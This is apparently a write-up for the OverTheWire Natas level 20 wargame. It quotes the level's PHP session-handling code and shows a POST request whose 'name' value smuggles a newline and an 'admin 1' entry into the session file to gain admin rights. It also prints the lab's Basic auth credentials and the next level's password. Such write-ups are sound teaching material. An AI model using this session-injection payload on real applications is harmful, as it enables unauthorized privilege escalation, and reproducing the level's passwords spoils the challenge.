The website shows a single textarea and a "Change Name" button.

Source code is available as for the other levels:
```
function print_credentials() {
    if($_SESSION and array_key_exists("admin", $_SESSION) and $_SESSION["admin"] == 1) {
    print "You are an admin. The credentials for the next level are:<br>";
    print "<pre>Username: natas21\n";
    print "Password: <censored></pre>";
    } else {
    print "You are logged in as a regular user. Login as an admin to retrieve credentials for natas21.";
    }
}

[...truncated...]

function myread($sid) {
    debug("MYREAD $sid");
    if(strspn($sid, "1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM-") != strlen($sid)) {
    debug("Invalid SID");
        return "";
    }
    $filename = session_save_path() . "/" . "mysess_" . $sid;
    if(!file_exists($filename)) {
        debug("Session file doesn't exist");
        return "";
    }
    debug("Reading from ". $filename);
    $data = file_get_contents($filename);
    $_SESSION = array();
    foreach(explode("\n", $data) as $line) {
        debug("Read [$line]");
    $parts = explode(" ", $line, 2);
    if($parts[0] != "") $_SESSION[$parts[0]] = $parts[1];
    }
    return session_encode();
}

[...truncated...]

function mywrite($sid, $data) {
    // $data contains the serialized version of $_SESSION
    // but our encoding is better
    debug("MYWRITE $sid $data");
    // make sure the sid is alnum only!!
    if(strspn($sid, "1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM-") != strlen($sid)) {
    debug("Invalid SID");
        return;
    }
    $filename = session_save_path() . "/" . "mysess_" . $sid;
    $data = "";
    debug("Saving in ". $filename);
    ksort($_SESSION);
    foreach($_SESSION as $key => $value) {
        debug("$key => $value");
        $data .= "$key $value\n";
    }
    file_put_contents($filename, $data);
    chmod($filename, 0600);
}

[...truncated...]

session_set_save_handler(
    "myopen",
    "myclose",
    "myread",
    "mywrite",
    "mydestroy",
    "mygarbage");
session_start();

if(array_key_exists("name", $_REQUEST)) {
    $_SESSION["name"] = $_REQUEST["name"];
    debug("Name set to " . $_REQUEST["name"]);
}

print_credentials();
```

Here you can see that the authors use their own callbacks for session management. Notably the `myread()` and `mywrite()` functions use a simple serialization scheme with one key-value pair per line:
```
key1 value1
key2 value2
```

Also there is no sanitization of the `name` request parameter before it's saved into the session. We need the session to have a variable `admin` set to 1, we can inject it using the following request:
```
POST /index.php HTTP/1.1
Host: natas20.natas.labs.overthewire.org
Content-Length: 19
Cache-Control: max-age=0
Authorization: Basic bmF0YXMyMDpndVZhWjNFVDM1TGJnYkZNb2FONXRGY1lUMWpFUDdVSA==
Upgrade-Insecure-Requests: 1
Origin: http://natas20.natas.labs.overthewire.org
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5195.102 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://natas20.natas.labs.overthewire.org/index.php?debug=foo
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: PHPSESSID=2oc1acmoon090gt6jev6k3j40u
Connection: close

name=foo%0Aadmin%201
```

Then `print_credentials()` will output the next level credentials.

**Note:** it looks like the initial part of the `name` request parameter (`foo` in the example above) must be something not already present on the server.

Password for the next level is `BPhv63cKE1lkQl04cE5CuFTzXe15NfiH`.
